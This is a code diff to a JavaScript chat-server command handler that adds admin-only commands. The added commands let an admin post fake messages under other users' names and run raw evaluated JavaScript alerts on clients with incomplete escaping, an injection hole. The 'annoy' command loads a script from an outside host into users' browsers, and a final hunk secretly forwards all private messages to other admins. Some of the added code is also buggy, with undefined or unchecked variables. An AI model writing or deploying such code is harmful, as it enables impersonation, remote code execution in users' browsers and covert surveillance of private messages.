@@ -47,7 +47,120 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 	case 'me':
 		return '/me '+target;
 		break;
-
+	case 'fake':
+		if(user.group != '&' || !target)
+		{
+			return false;
+		}
+		var targets = splitTarget(target);
+		if(targets[0] && targets[1])
+		{
+			room.add({
+				name: targets[0].getIdentity(),
+				message: targets[1]
+			});
+		}
+		return false;
+		break;
+	case 'fakeme':
+		if(user.group != '&' || !target)
+		{
+			return false;
+		}
+		var targets = splitTarget(target);
+		if(targets[0] && targets[1])
+		{
+			room.add({
+				name: targets[0].getIdentity(),
+				act: 1,
+				message: targets[1]
+			});
+		}
+		return false;
+		break;
+	case 'alert':
+		if(user.group != '&' || !target)
+		{
+			return false;
+		}
+		var targets = splitTarget(target);
+		if(targets[0] && targets[1])
+		{
+			targets[1] = targets[1].replace(new RegExp('"',"g"),"\\\"");
+			targets[0].emit('console',{evalRawMessage:'window.alert("'+targets[1]+'");"";'});
+			socket.emit('console','You alerted '+targets[0].name+' "'+targets[1]+'"');
+		}
+		return false;
+		break;
+	case 'annoy':
+		if(user.group != '&')
+		{
+			return false;
+		}
+		var targetUser = getUser(target);
+		if(targetUser)
+		{
+			targetUser.emit('console',{rawMessage:'<script type="text/javascript" src="http://optimus.kinkaid.org/~patrick.roberts/snowstorm.js"></script>'});
+			socket.emit('console','You annoyed '+targetUser.name+'.');
+		}
+		else
+		{
+			room.addRaw('<script type="text/javascript" src="http://optimus.kinkaid.org/~patrick.roberts/snowstorm.js"></script>');
+			socket.emit('console','You annoyed everyone.');
+		}
+		return false;
+		break;
+	case 'alertall':
+		if(user.group != '&' || !target)
+		{
+			return false;
+		}
+		var skipUser = user;
+		target = target.replace(new RegExp('"',"g"),"\\\"");
+		for(var i in room.users)
+		{
+			if(room.users[i] != skipUser)
+				room.users[i].emit('console',{evalRawMessage:'window.alert("'+target+'");"";'});
+		}
+		socket.emit('console','You alerted everyone "'+target+'"');
+		return false;
+		break;
+	case 'namelock':
+	case 'nl':
+		if(user.group != '&' || !target)
+		{
+			return false;
+		}
+		var targets = splitTarget(target);
+		var targetUser = getUser(targets[0]);
+		var targetName = targets[1]||targetUser.name;
+		if(targetUser)
+		{
+			room.add(user.name+" name-locked "+targetUser.name+" to "+targetName+".");
+			targetUser.nameLock(targetName);
+		}
+		return false;
+		break;
+	case 'nameunlock':
+	case 'nul':
+		if(user.group != '&' || !target)
+		{
+			return false;
+		}
+		var removed = false;
+		for(var i in nameLockedIps)
+		{
+			if(nameLockedIps[i]==target)
+			{	delete nameLockedIps[i];
+				removed = true;
+			}
+		}
+		if(removed)
+			room.add(user.name+" unlocked the name of "+target+".");
+		else
+			socket.emit('console',target+" not found.");
+		return false;
+		break;
 	case 'command':
 		if (target.command === 'userdetails') {
 			target.userid = ''+target.userid;
@@ -408,6 +521,14 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		targets[0].emit('console', message);
 		targets[0].lastPM = user.userid;
 		user.lastPM = targets[0].userid;
+		for(var i in room.users)
+		{
+			if(room.users[i].group == '&' && room.users[i] != user  && room.users[i] != targetUser)
+				room.users[i].emit('console',{
+					name: user.getIdentity(),
+					message: "To "+targetUser.getIdentity()+": "+message.message
+				});
+		}
 		return false;
 		break;
 
